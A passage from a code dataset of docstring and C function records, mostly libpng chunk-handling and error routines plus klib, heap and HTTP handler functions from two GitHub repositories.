i;\n         png_bytep rp = row;\n         png_bytep pp = prev_row;\n         png_bytep lp = row;\n         png_uint_32 bpp = (row_info->pixel_depth + 7) >> 3;\n         png_uint_32 istop = row_info->rowbytes - bpp;\n\n         for (i = 0; i < bpp; i++)\n         {\n            *rp = (png_byte)(((int)(*rp) +\n               ((int)(*pp++) / 2 )) & 0xff);\n            rp++;\n         }\n\n         for (i = 0; i < istop; i++)\n         {\n            *rp = (png_byte)(((int)(*rp) +\n               (int)(*pp++ + *lp++) / 2 ) & 0xff);\n            rp++;\n         }\n         break;\n      }\n      case PNG_FILTER_VALUE_PAETH:\n      {\n         png_uint_32 i;\n         png_bytep rp = row;\n         png_bytep pp = prev_row;\n         png_bytep lp = row;\n         png_bytep cp = prev_row;\n         png_uint_32 bpp = (row_info->pixel_depth + 7) >> 3;\n         png_uint_32 istop=row_info->rowbytes - bpp;\n\n         for (i = 0; i < bpp; i++)\n         {\n            *rp = (png_byte)(((int)(*rp) + (int)(*pp++)) & 0xff);\n            rp++;\n         }\n\n         for (i = 0; i < istop; i++)   /* Use leftover rp,pp */\n         {\n            int a, b, c, pa, pb, pc, p;\n            a = *lp++;\n            b = *pp++;\n            c = *cp++;\n            p = b - c;\n            pc = a - c;\n#ifdef PNG_USE_ABS\n            pa = abs(p);\n            pb = abs(pc);\n            pc = abs(p + pc);\n#else\n            pa = p < 0 ? -p : p;\n            pb = pc < 0 ? -pc : pc;\n            pc = (p + pc) < 0 ? -(p + pc) : p + pc;\n#endif\n            p = (pa <= pb && pa <= pc) ? a : (pb <= pc) ? b : c;\n\n            *rp = (png_byte)(((int)(*rp) + p) & 0xff);\n            rp++;\n         }\n         break;\n      }\n      default:\n         png_warning(png_ptr, \"Ignoring bad adaptive filter type\");\n         *row = 0;\n         break;\n   }\n#endif\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_handle_tRNS(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)", "code": "{\n   png_byte readbuf[PNG_MAX_PALETTE_LENGTH];\n\n   png_debug(1, \"in png_handle_tRNS\");\n\n   if (!(png_ptr->mode & PNG_HAVE_IHDR))\n      png_error(png_ptr, \"Missing IHDR before tRNS\");\n   else if (png_ptr->mode & PNG_HAVE_IDAT)\n   {\n      png_warning(png_ptr, \"Invalid tRNS after IDAT\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n   else if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_tRNS))\n   {\n      png_warning(png_ptr, \"Duplicate tRNS chunk\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   if (png_ptr->color_type == PNG_COLOR_TYPE_GRAY)\n   {\n      png_byte buf[2];\n\n      if (length != 2)\n      {\n         png_warning(png_ptr, \"Incorrect tRNS chunk length\");\n         png_crc_finish(png_ptr, length);\n         return;\n      }\n\n      png_crc_read(png_ptr, buf, 2);\n      png_ptr->num_trans = 1;\n      png_ptr->trans_values.gray = png_get_uint_16(buf);\n   }\n   else if (png_ptr->color_type == PNG_COLOR_TYPE_RGB)\n   {\n      png_byte buf[6];\n\n      if (length != 6)\n      {\n         png_warning(png_ptr, \"Incorrect tRNS chunk length\");\n         png_crc_finish(png_ptr, length);\n         return;\n      }\n      png_crc_read(png_ptr, buf, (png_size_t)length);\n      png_ptr->num_trans = 1;\n      png_ptr->trans_values.red = png_get_uint_16(buf);\n      png_ptr->trans_values.green = png_get_uint_16(buf + 2);\n      png_ptr->trans_values.blue = png_get_uint_16(buf + 4);\n   }\n   else if (png_ptr->color_type == PNG_COLOR_TYPE_PALETTE)\n   {\n      if (!(png_ptr->mode & PNG_HAVE_PLTE))\n      {\n         /* Should be an error, but we can cope with it. */\n         png_warning(png_ptr, \"Missing PLTE before tRNS\");\n      }\n      if (length > (png_uint_32)png_ptr->num_palette ||\n          length > PNG_MAX_PALETTE_LENGTH)\n      {\n         png_warning(png_ptr, \"Incorrect tRNS chunk length\");\n         png_crc_finish(png_ptr, length);\n         return;\n      }\n      if (length == 0)\n      {\n         png_warning(png_ptr, \"Zero length tRNS chunk\");\n         png_crc_finish(png_ptr, length);\n         return;\n      }\n      png_crc_read(png_ptr, readbuf, (png_size_t)length);\n      png_ptr->num_trans = (png_uint_16)length;\n   }\n   else\n   {\n      png_warning(png_ptr, \"tRNS chunk not allowed with alpha channel\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   if (png_crc_finish(png_ptr, 0))\n   {\n      png_ptr->num_trans = 0;\n      return;\n   }\n\n   png_set_tRNS(png_ptr, info_ptr, readbuf, png_ptr->num_trans,\n      &(png_ptr->trans_values));\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_check_chunk_name(png_structp png_ptr, png_bytep chunk_name)", "code": "{\n   png_debug(1, \"in png_check_chunk_name\");\n   if (isnonalpha(chunk_name[0]) || isnonalpha(chunk_name[1]) ||\n       isnonalpha(chunk_name[2]) || isnonalpha(chunk_name[3]))\n   {\n      png_chunk_error(png_ptr, \"invalid chunk type\");\n   }\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_handle_oFFs(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)", "code": "{\n   png_byte buf[9];\n   png_int_32 offset_x, offset_y;\n   int unit_type;\n\n   png_debug(1, \"in png_handle_oFFs\");\n\n   if (!(png_ptr->mode & PNG_HAVE_IHDR))\n      png_error(png_ptr, \"Missing IHDR before oFFs\");\n   else if (png_ptr->mode & PNG_HAVE_IDAT)\n   {\n      png_warning(png_ptr, \"Invalid oFFs after IDAT\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n   else if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_oFFs))\n   {\n      png_warning(png_ptr, \"Duplicate oFFs chunk\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   if (length != 9)\n   {\n      png_warning(png_ptr, \"Incorrect oFFs chunk length\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   png_crc_read(png_ptr, buf, 9);\n   if (png_crc_finish(png_ptr, 0))\n      return;\n\n   offset_x = png_get_int_32(buf);\n   offset_y = png_get_int_32(buf + 4);\n   unit_type = buf[8];\n   png_set_oFFs(png_ptr, info_ptr, offset_x, offset_y, unit_type);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "//*\n//* Parse AMS\n//*\n", "func_signal": "byte aui_cfg_parse(AARRAYP * arr, char * bufs)", "code": "{\n  if (bufs == NULL) {\n    return 0;\n  }\n  \n  if (*arr == NULL) {\n    *arr = aarray_create();\n  }\n  \n  char * buf = strdup(bufs);\n  char * vuf = buf;\n  \n  if (strlen(vuf) > 3) {\n    //-- Check UTF-8 File Header\n    if ((vuf[0] == 0xEF) && (vuf[1] == 0xBB) && (vuf[2] == 0xBF)) {\n      vuf += 3;\n    }\n  }\n  \n  byte state = 0;\n  byte slash = 0;\n  char c = 0;\n  char pc = 0;\n  char * key = NULL;\n  char * val = NULL;\n  \n  while ((c = *vuf)) {\n    if (state == 0) {\n      //-- First State\n      if (!isspace(c)) {\n        key = vuf;\n        state = 2;\n      }\n      else if (c == '#') {\n        state = 1;\n      }\n    }\n    else if (state == 1) {\n      //-- Comment\n      if (c == '\\n') {\n        state = 0;\n      }\n    }\n    else if (state == 2) {\n      if (isspace(c) || (c == '=') || (c == '\\n')) {\n        *vuf = 0;\n        \n        if (c == '=') {\n          state = 3;\n        }\n        else if (c == '\\n') {\n          state = 0;\n        }\n      }\n    }\n    else if (state == 3) {\n      if (!isspace(c)) {\n        val = vuf;\n        state = 4;\n        pc = c;\n      }\n      else if (c == '\\n') {\n        state = 0;\n      }\n    }\n    else if (state == 4) {\n      if (((c == '\\n') && (pc != '\\\\')) || (*(vuf + 1) == 0)) {\n        if ((c == '\\n') && (pc != '\\\\')) {\n          *vuf = 0;\n        }\n        \n        //-- Cleanup backslashes\n        int i;\n        int j = 0;\n        int l = strlen(val);\n        \n        for (i = 0; i < l; i++) {\n          if ((val[i] == '\\\\')\n              && (val[i + 1] == '\\n')) {\n            continue;\n          }\n          \n          val[j++] = val[i];\n        }\n        \n        val[j] = 0;\n        //-- Save Lang Value\n        aarray_set(*arr, key, val);\n        //-- End Of String\n        state = 0;\n      }\n      \n      pc = c;\n    }\n    \n    vuf++;\n  }\n  \n  free(buf);\n  return 1;\n}", "path": "src\\main\\libs\\aroma_config.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_handle_pHYs(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)", "code": "{\n   png_byte buf[9];\n   png_uint_32 res_x, res_y;\n   int unit_type;\n\n   png_debug(1, \"in png_handle_pHYs\");\n\n   if (!(png_ptr->mode & PNG_HAVE_IHDR))\n      png_error(png_ptr, \"Missing IHDR before pHYs\");\n   else if (png_ptr->mode & PNG_HAVE_IDAT)\n   {\n      png_warning(png_ptr, \"Invalid pHYs after IDAT\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n   else if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_pHYs))\n   {\n      png_warning(png_ptr, \"Duplicate pHYs chunk\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   if (length != 9)\n   {\n      png_warning(png_ptr, \"Incorrect pHYs chunk length\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   png_crc_read(png_ptr, buf, 9);\n   if (png_crc_finish(png_ptr, 0))\n      return;\n\n   res_x = png_get_uint_32(buf);\n   res_y = png_get_uint_32(buf + 4);\n   unit_type = buf[8];\n   png_set_pHYs(png_ptr, info_ptr, res_x, res_y, unit_type);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_default_warning(png_structp png_ptr, png_const_charp warning_message)", "code": "{\n#ifdef PNG_CONSOLE_IO_SUPPORTED\n#  ifdef PNG_ERROR_NUMBERS_SUPPORTED\n   if (*warning_message == PNG_LITERAL_SHARP)\n   {\n     int offset;\n     char warning_number[16];\n     for (offset = 0; offset < 15; offset++)\n     {\n        warning_number[offset] = warning_message[offset + 1];\n        if (warning_message[offset] == ' ')\n            break;\n     }\n     if ((offset > 1) && (offset < 15))\n     {\n       warning_number[offset + 1] = '\\0';\n       fprintf(stderr, \"libpng warning no. %s: %s\",\n          warning_number, warning_message + offset);\n       fprintf(stderr, PNG_STRING_NEWLINE);\n     }\n     else\n     {\n       fprintf(stderr, \"libpng warning: %s\",\n          warning_message);\n       fprintf(stderr, PNG_STRING_NEWLINE);\n     }\n   }\n   else\n#  endif\n   {\n     fprintf(stderr, \"libpng warning: %s\", warning_message);\n     fprintf(stderr, PNG_STRING_NEWLINE);\n   }\n#else\n   warning_message = warning_message; /* Make compiler happy */\n#endif\n   png_ptr = png_ptr; /* Make compiler happy */\n}", "path": "libs\\png\\pngerror.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* Grab an unsigned 32-bit integer from a buffer in big-endian format. */\n", "func_signal": "png_uint_32 PNGAPI\npng_get_uint_32(png_bytep buf)", "code": "{\n   png_uint_32 i = ((png_uint_32)(*buf) << 24) +\n      ((png_uint_32)(*(buf + 1)) << 16) +\n      ((png_uint_32)(*(buf + 2)) << 8) +\n      (png_uint_32)(*(buf + 3));\n\n   return (i);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* Grab a signed 32-bit integer from a buffer in big-endian format.  The\n * data is stored in the PNG file in two's complement format, and it is\n * assumed that the machine format for signed integers is the same.\n */\n", "func_signal": "png_int_32 PNGAPI\npng_get_int_32(png_bytep buf)", "code": "{\n   png_int_32 i = ((png_int_32)(*buf) << 24) +\n      ((png_int_32)(*(buf + 1)) << 16) +\n      ((png_int_32)(*(buf + 2)) << 8) +\n      (png_int_32)(*(buf + 3));\n\n   return (i);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_decompress_chunk(png_structp png_ptr, int comp_type,\n    png_size_t chunklength,\n    png_size_t prefix_size, png_size_t *newlength)", "code": "{\n   /* The caller should guarantee this */\n   if (prefix_size > chunklength)\n   {\n      /* The recovery is to delete the chunk. */\n      png_warning(png_ptr, \"invalid chunklength\");\n      prefix_size = 0; /* To delete everything */\n   }\n\n   else if (comp_type == PNG_COMPRESSION_TYPE_BASE)\n   {\n      png_size_t expanded_size = png_inflate(png_ptr,\n                (png_bytep)(png_ptr->chunkdata + prefix_size),\n                chunklength - prefix_size,\n                0/*output*/, 0/*output size*/);\n\n      /* Now check the limits on this chunk - if the limit fails the\n       * compressed data will be removed, the prefix will remain.\n       */\n#ifdef PNG_SET_CHUNK_MALLOC_LIMIT_SUPPORTED\n      if (png_ptr->user_chunk_malloc_max &&\n          (prefix_size + expanded_size >= png_ptr->user_chunk_malloc_max - 1))\n#else\n#  ifdef PNG_USER_CHUNK_MALLOC_MAX\n      if ((PNG_USER_CHUNK_MALLOC_MAX > 0) &&\n          prefix_size + expanded_size >= PNG_USER_CHUNK_MALLOC_MAX - 1)\n#  endif\n#endif\n         png_warning(png_ptr, \"Exceeded size limit while expanding chunk\");\n\n      /* If the size is zero either there was an error and a message\n       * has already been output (warning) or the size really is zero\n       * and we have nothing to do - the code will exit through the\n       * error case below.\n       */\n#if defined(PNG_SET_CHUNK_MALLOC_LIMIT_SUPPORTED) || \\\n    defined(PNG_USER_CHUNK_MALLOC_MAX)\n      else\n#endif\n      if (expanded_size > 0)\n      {\n         /* Success (maybe) - really uncompress the chunk. */\n         png_size_t new_size = 0;\n         png_charp text = png_malloc_warn(png_ptr,\n                        prefix_size + expanded_size + 1);\n\n         if (text != NULL)\n         {\n            png_memcpy(text, png_ptr->chunkdata, prefix_size);\n            new_size = png_inflate(png_ptr,\n                (png_bytep)(png_ptr->chunkdata + prefix_size),\n                chunklength - prefix_size,\n                (png_bytep)(text + prefix_size), expanded_size);\n            text[prefix_size + expanded_size] = 0; /* just in case */\n\n            if (new_size == expanded_size)\n            {\n               png_free(png_ptr, png_ptr->chunkdata);\n               png_ptr->chunkdata = text;\n               *newlength = prefix_size + expanded_size;\n               return; /* The success return! */\n            }\n\n            png_warning(png_ptr, \"png_inflate logic error\");\n            png_free(png_ptr, text);\n         }\n         else\n          png_warning(png_ptr, \"Not enough memory to decompress chunk.\");\n      }\n   }\n\n   else /* if (comp_type != PNG_COMPRESSION_TYPE_BASE) */\n   {\n#if defined(PNG_STDIO_SUPPORTED) && !defined(_WIN32_WCE)\n      char umsg[50];\n\n      png_snprintf(umsg, sizeof umsg, \"Unknown zTXt compression type %d\",\n          comp_type);\n      png_warning(png_ptr, umsg);\n#else\n      png_warning(png_ptr, \"Unknown zTXt compression type\");\n#endif\n\n      /* The recovery is to simply drop the data. */\n   }\n\n   /* Generic error return - leave the prefix, delete the compressed\n    * data, reallocate the chunkdata to remove the potentially large\n    * amount of compressed data.\n    */\n   {\n      png_charp text = png_malloc_warn(png_ptr, prefix_size + 1);\n      if (text != NULL)\n      {\n         if (prefix_size > 0)\n            png_memcpy(text, png_ptr->chunkdata, prefix_size);\n         png_free(png_ptr, png_ptr->chunkdata);\n         png_ptr->chunkdata = text;\n\n         /* This is an extra zero in the 'uncompressed' part. */\n         *(png_ptr->chunkdata + prefix_size) = 0x00;\n      }\n      /* Ignore a malloc error here - it is safe. */\n   }\n\n   *newlength = prefix_size;\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_opt_crc_finish(png_structp png_ptr, png_uint_32 skip, int check_crc)", "code": "{\n   png_size_t i;\n   png_size_t istop = png_ptr->zbuf_size;\n\n   for (i = (png_size_t)skip; i > istop; i -= istop)\n   {\n      png_crc_read(png_ptr, png_ptr->zbuf, png_ptr->zbuf_size);\n   }\n   if (i)\n   {\n      png_crc_read(png_ptr, png_ptr->zbuf, i);\n   }\n\n   if (png_crc_error(png_ptr))\n   {\n      if (!check_crc) {\n         png_chunk_warning(png_ptr, \"CRC error\");\n         return (1);\n      }\n      if (((png_ptr->chunk_name[0] & 0x20) &&                /* Ancillary */\n          !(png_ptr->flags & PNG_FLAG_CRC_ANCILLARY_NOWARN)) ||\n          (!(png_ptr->chunk_name[0] & 0x20) &&             /* Critical  */\n          (png_ptr->flags & PNG_FLAG_CRC_CRITICAL_USE)))\n      {\n         png_chunk_warning(png_ptr, \"CRC error\");\n      }\n      else\n      {\n         png_chunk_error(png_ptr, \"CRC error\");\n      }\n      return (1);\n   }\n\n   return (0);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_format_buffer(png_structp png_ptr, png_charp buffer, png_const_charp\n   error_message)", "code": "{\n   int iout = 0, iin = 0;\n\n   while (iin < 4)\n   {\n      int c = png_ptr->chunk_name[iin++];\n      if (isnonalpha(c))\n      {\n         buffer[iout++] = PNG_LITERAL_LEFT_SQUARE_BRACKET;\n         buffer[iout++] = png_digit[(c & 0xf0) >> 4];\n         buffer[iout++] = png_digit[c & 0x0f];\n         buffer[iout++] = PNG_LITERAL_RIGHT_SQUARE_BRACKET;\n      }\n      else\n      {\n         buffer[iout++] = (png_byte)c;\n      }\n   }\n\n   if (error_message == NULL)\n      buffer[iout] = '\\0';\n   else\n   {\n      buffer[iout++] = ':';\n      buffer[iout++] = ' ';\n\n      iin = 0;\n      while (iin < PNG_MAX_ERROR_TEXT-1 && error_message[iin] != '\\0')\n         buffer[iout++] = error_message[iin++];\n\n      /* iin < PNG_MAX_ERROR_TEXT, so the following is safe: */\n      buffer[iout] = '\\0';\n   }\n}", "path": "libs\\png\\pngerror.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_handle_tIME(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)", "code": "{\n   png_byte buf[7];\n   png_time mod_time;\n\n   png_debug(1, \"in png_handle_tIME\");\n\n   if (!(png_ptr->mode & PNG_HAVE_IHDR))\n      png_error(png_ptr, \"Out of place tIME chunk\");\n   else if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_tIME))\n   {\n      png_warning(png_ptr, \"Duplicate tIME chunk\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   if (png_ptr->mode & PNG_HAVE_IDAT)\n      png_ptr->mode |= PNG_AFTER_IDAT;\n\n   if (length != 7)\n   {\n      png_warning(png_ptr, \"Incorrect tIME chunk length\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   png_crc_read(png_ptr, buf, 7);\n   if (png_crc_finish(png_ptr, 0))\n      return;\n\n   mod_time.second = buf[6];\n   mod_time.minute = buf[5];\n   mod_time.hour = buf[4];\n   mod_time.day = buf[3];\n   mod_time.month = buf[2];\n   mod_time.year = png_get_uint_16(buf);\n\n   png_set_tIME(png_ptr, info_ptr, &mod_time);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "// s MUST BE a null terminated string; l = strlen(s)\n", "func_signal": "int ksplit_core(char *s, int delimiter, int *_max, int **_offsets)", "code": "{\n\tint i, n, max, last_char, last_start, *offsets, l;\n\tn = 0; max = *_max; offsets = *_offsets;\n\tl = strlen(s);\n\t\n#define __ksplit_aux do {\t\t\t\t\t\t\\\n\t\tif (_offsets) {\t\t\t\t\t\t\\\n\t\t\ts[i] = 0;\t\t\t\t\t\\\n\t\t\tif (n == max) {\t\t\t\t\t\\\n\t\t\t\tint *tmp;\t\t\t\t\\\n\t\t\t\tmax = max? max<<1 : 2;\t\t\t\\\n\t\t\t\tif ((tmp = (int*)realloc(offsets, sizeof(int) * max))) {  \\\n\t\t\t\t\toffsets = tmp;\t\t\t\\\n\t\t\t\t} else\t{\t\t\t\t\\\n\t\t\t\t\tfree(offsets);\t\t\t\\\n\t\t\t\t\t*_offsets = NULL;\t\t\\\n\t\t\t\t\treturn 0;\t\t\t\\\n\t\t\t\t}\t\t\t\t\t\\\n\t\t\t}\t\t\t\t\t\t\\\n\t\t\toffsets[n++] = last_start;\t\t\t\\\n\t\t} else ++n;\t\t\t\t\t\t\\\n\t} while (0)\n\n\tfor (i = 0, last_char = last_start = 0; i <= l; ++i) {\n\t\tif (delimiter == 0) {\n\t\t\tif (isspace(s[i]) || s[i] == 0) {\n\t\t\t\tif (isgraph(last_char)) __ksplit_aux; // the end of a field\n\t\t\t} else {\n\t\t\t\tif (isspace(last_char) || last_char == 0) last_start = i;\n\t\t\t}\n\t\t} else {\n\t\t\tif (s[i] == delimiter || s[i] == 0) {\n\t\t\t\tif (last_char != 0 && last_char != delimiter) __ksplit_aux; // the end of a field\n\t\t\t} else {\n\t\t\t\tif (last_char == delimiter || last_char == 0) last_start = i;\n\t\t\t}\n\t\t}\n\t\tlast_char = s[i];\n\t}\n\t*_max = max; *_offsets = offsets;\n\treturn n;\n}", "path": "deps\\klib\\kstring.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/**\n * @return a new heap on success; NULL otherwise */\n", "func_signal": "static heap_t* __ensurecapacity(heap_t * h)", "code": "{\n    if (h->count < h->size)\n        return h;\n\n    h->size *= 2;\n\n    return realloc(h, heap_sizeof(h->size));\n}", "path": "deps\\heap\\heap.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/**\n * Initialize the query data structure\n *\n * @param size   Number of bytes used to store a score; valid valures are 1 or 2\n * @param qlen   Length of the query sequence\n * @param query  Query sequence\n * @param m      Size of the alphabet\n * @param mat    Scoring matrix in a one-dimension array\n *\n * @return       Query data structure\n */\n", "func_signal": "kswq_t *ksw_qinit(int size, int qlen, const uint8_t *query, int m, const int8_t *mat)", "code": "{\n\tkswq_t *q;\n\tint slen, a, tmp, p;\n\n\tsize = size > 1? 2 : 1;\n\tp = 8 * (3 - size); // # values per __m128i\n\tslen = (qlen + p - 1) / p; // segmented length\n\tq = (kswq_t*)malloc(sizeof(kswq_t) + 256 + 16 * slen * (m + 4)); // a single block of memory\n\tq->qp = (__m128i*)(((size_t)q + sizeof(kswq_t) + 15) >> 4 << 4); // align memory\n\tq->H0 = q->qp + slen * m;\n\tq->H1 = q->H0 + slen;\n\tq->E  = q->H1 + slen;\n\tq->Hmax = q->E + slen;\n\tq->slen = slen; q->qlen = qlen; q->size = size;\n\t// compute shift\n\ttmp = m * m;\n\tfor (a = 0, q->shift = 127, q->mdiff = 0; a < tmp; ++a) { // find the minimum and maximum score\n\t\tif (mat[a] < (int8_t)q->shift) q->shift = mat[a];\n\t\tif (mat[a] > (int8_t)q->mdiff) q->mdiff = mat[a];\n\t}\n\tq->max = q->mdiff;\n\tq->shift = 256 - q->shift; // NB: q->shift is uint8_t\n\tq->mdiff += q->shift; // this is the difference between the min and max scores\n\t// An example: p=8, qlen=19, slen=3 and segmentation:\n\t//  {{0,3,6,9,12,15,18,-1},{1,4,7,10,13,16,-1,-1},{2,5,8,11,14,17,-1,-1}}\n\tif (size == 1) {\n\t\tint8_t *t = (int8_t*)q->qp;\n\t\tfor (a = 0; a < m; ++a) {\n\t\t\tint i, k, nlen = slen * p;\n\t\t\tconst int8_t *ma = mat + a * m;\n\t\t\tfor (i = 0; i < slen; ++i)\n\t\t\t\tfor (k = i; k < nlen; k += slen) // p iterations\n\t\t\t\t\t*t++ = (k >= qlen? 0 : ma[query[k]]) + q->shift;\n\t\t}\n\t} else {\n\t\tint16_t *t = (int16_t*)q->qp;\n\t\tfor (a = 0; a < m; ++a) {\n\t\t\tint i, k, nlen = slen * p;\n\t\t\tconst int8_t *ma = mat + a * m;\n\t\t\tfor (i = 0; i < slen; ++i)\n\t\t\t\tfor (k = i; k < nlen; k += slen) // p iterations\n\t\t\t\t\t*t++ = (k >= qlen? 0 : ma[query[k]]);\n\t\t}\n\t}\n\treturn q;\n}", "path": "deps\\klib\\ksw.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "// Deflate the block in fp->uncompressed_block into fp->compressed_block. Also adds an extra field that stores the compressed block length.\n", "func_signal": "static int deflate_block(BGZF *fp, int block_length)", "code": "{\n\tuint8_t *buffer = fp->compressed_block;\n\tint buffer_size = BGZF_BLOCK_SIZE;\n\tint input_length = block_length;\n\tint compressed_length = 0;\n\tint remaining;\n\tuint32_t crc;\n\n\tassert(block_length <= BGZF_BLOCK_SIZE); // guaranteed by the caller\n\tmemcpy(buffer, g_magic, BLOCK_HEADER_LENGTH); // the last two bytes are a place holder for the length of the block\n\twhile (1) { // loop to retry for blocks that do not compress enough\n\t\tint status;\n\t\tz_stream zs;\n\t\tzs.zalloc = NULL;\n\t\tzs.zfree = NULL;\n\t\tzs.next_in = fp->uncompressed_block;\n\t\tzs.avail_in = input_length;\n\t\tzs.next_out = (void*)&buffer[BLOCK_HEADER_LENGTH];\n\t\tzs.avail_out = buffer_size - BLOCK_HEADER_LENGTH - BLOCK_FOOTER_LENGTH;\n\t\tstatus = deflateInit2(&zs, fp->compress_level, Z_DEFLATED, -15, 8, Z_DEFAULT_STRATEGY); // -15 to disable zlib header/footer\n\t\tif (status != Z_OK) {\n\t\t\tfp->errcode |= BGZF_ERR_ZLIB;\n\t\t\treturn -1;\n\t\t}\n\t\tstatus = deflate(&zs, Z_FINISH);\n\t\tif (status != Z_STREAM_END) { // not compressed enough\n\t\t\tdeflateEnd(&zs); // reset the stream\n\t\t\tif (status == Z_OK) { // reduce the size and recompress\n\t\t\t\tinput_length -= 1024;\n\t\t\t\tassert(input_length > 0); // logically, this should not happen\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfp->errcode |= BGZF_ERR_ZLIB;\n\t\t\treturn -1;\n\t\t}\n\t\tif (deflateEnd(&zs) != Z_OK) {\n\t\t\tfp->errcode |= BGZF_ERR_ZLIB;\n\t\t\treturn -1;\n\t\t}\n\t\tcompressed_length = zs.total_out;\n\t\tcompressed_length += BLOCK_HEADER_LENGTH + BLOCK_FOOTER_LENGTH;\n\t\tassert(compressed_length <= BGZF_BLOCK_SIZE);\n\t\tbreak;\n\t}\n\n\tassert(compressed_length > 0);\n\tpackInt16((uint8_t*)&buffer[16], compressed_length - 1); // write the compressed_length; -1 to fit 2 bytes\n\tcrc = crc32(0L, NULL, 0L);\n\tcrc = crc32(crc, fp->uncompressed_block, input_length);\n\tpackInt32((uint8_t*)&buffer[compressed_length-8], crc);\n\tpackInt32((uint8_t*)&buffer[compressed_length-4], input_length);\n\n\tremaining = block_length - input_length;\n\tif (remaining > 0) {\n\t\tassert(remaining <= input_length);\n\t\tmemcpy(fp->uncompressed_block, fp->uncompressed_block + input_length, remaining);\n\t}\n\tfp->block_offset = remaining;\n\treturn compressed_length;\n}", "path": "deps\\klib\\bgzf.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/** Put a new document into the database without having to specify a key.\n * The key is a randomly generated uuid4 encoded in URL-safe base64. This key\n * is returned to the client via the Location HTTP header */\n", "func_signal": "static int __post(h2o_req_t *req)", "code": "{\n    char id_str[1 + ID_STR_LEN];\n\n    batch_item_t item = {\n        .flags       = MDB_NOOVERWRITE,\n        .key.mv_data = id_str + 1,\n        .key.mv_size = ID_STR_LEN,\n        .val.mv_data = req->entity.base,\n        .val.mv_size = req->entity.len,\n    };\n\n    do\n    {\n        __generate_uuid4(id_str);\n        int e = bmon_offer(&sv->batch, &item);\n        if (-1 == e)\n            return h2oh_respond_with_error(req, 400, batcher_error);\n    }\n    while (item.flags == WOULD_OVERWRITE);\n\n    id_str[0] = '/';\n    h2o_add_header(&req->pool,\n                   &req->res.headers,\n                   H2O_TOKEN_LOCATION,\n                   NULL,\n                   id_str,\n                   1 + ID_STR_LEN);\n    return h2oh_respond_with_success(req, 200);\n}", "path": "src\\main.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
